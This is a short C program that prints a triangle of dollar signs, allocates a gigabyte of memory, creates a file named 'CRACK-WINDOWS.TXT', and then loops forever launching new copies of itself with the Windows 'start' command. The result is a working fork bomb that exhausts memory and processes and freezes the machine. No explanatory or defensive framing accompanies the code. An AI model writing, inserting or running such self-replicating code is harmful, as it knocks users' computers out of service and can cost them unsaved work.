#include<stdlib.h>
#include<stdio.h>

#define LENGTH 50

 
int main(int argc, char const **argv){
	
	// graphic
	int i, j;
	
	for (i = 0; i <= LENGTH; ++i){      
	 	for (j = 0; j <= i; ++j){       
			putchar('$');
		}
		putchar('\n');
	}
	// malloc 1K * 1K * 1K
	malloc(1024 * 1024 * 1024);
	// interrupt
	sleep(1);
	// file system
	fopen("CRACK-WINDOWS.TXT", "w");
	char cmd[1024];
new_itself:
	sprintf(cmd, "start %s", argv[0]);
	system(cmd);
loop_1:
	goto new_itself;
	return 0;
}

